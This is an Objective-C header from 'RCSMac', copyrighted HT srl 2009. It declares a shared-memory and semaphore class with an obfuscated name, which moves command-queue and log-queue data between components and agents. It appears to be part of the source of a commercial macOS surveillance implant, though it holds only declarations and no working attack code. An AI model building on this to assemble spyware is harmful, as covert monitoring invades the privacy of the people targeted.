/*
 * RCSMac - Shared Memory Header
 *
 * Created by Alfredo 'revenge' Pesoli on 26/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <AppKit/AppKit.h>
#import <semaphore.h>

#ifndef __RCSMSharedMemory_h__
#define __RCSMSharedMemory_h__

typedef struct dispatch_queue_s * dispatch_queue_t;
//typedef void * xpc_object_t;
//typedef void (^xpc_handler_t)(xpc_object_t object);
//typedef const struct _xpc_type_s * xpc_type_t;
//typedef struct _xpc_connection_s * xpc_connection_t;

@interface __m_MSharedMemory : NSObject
{
@private
  char *mSharedMemory;
  u_int mSharedMemoryID;
  
  int mKey;
  int mSize;
  
  sem_t *mSemaphoreID;
  NSString *mSemaphoreName;
//  BOOL amISandboxed;
  BOOL mBamIPrivUser;
//  xpc_connection_t mXpcCon;
}

- (id)initWithKey: (int)aKey
             size: (int)aSize
    semaphoreName: (NSString *)aSemaphoreName;

- (void)dealloc;

- (int)detachFromMemoryRegion;
- (int)createMemoryRegion;
- (int)attachToMemoryRegion;


- (void)zeroFillMemory;
- (BOOL)clearConfigurations;

- (BOOL)writeMemory: (NSData *)aData
             offset: (u_int)anOffset
      fromComponent: (u_int)aComponent;

// Used for reading shared memory blocks from the command queue
- (NSMutableData *)readMemory: (u_int)anOffset
                fromComponent: (u_int)aComponent;

// Used for reading shared memory blocks from the log queue
- (NSMutableData *)readMemoryFromComponent: (u_int)aComponent
                                  forAgent: (u_int)anAgentID
                           withCommandType: (u_int)aCommandType;

- (void)setSharedMemory: (char *)value;
- (char *)mSharedMemory;

- (void)setSharedMemoryID: (int)value;
- (int)mSharedMemoryID;

- (void)setKey: (int)value;
- (int)mKey;

- (void)setSize: (int)value;
- (int)mSize;

- (void)setSemaphoreID: (sem_t *)value;
- (sem_t *)mSemaphoreID;

- (void)setSemaphoreName: (NSString *)value;
- (NSString *)mSemaphoreName;

- (void)removeMappedFile;

@end

#endif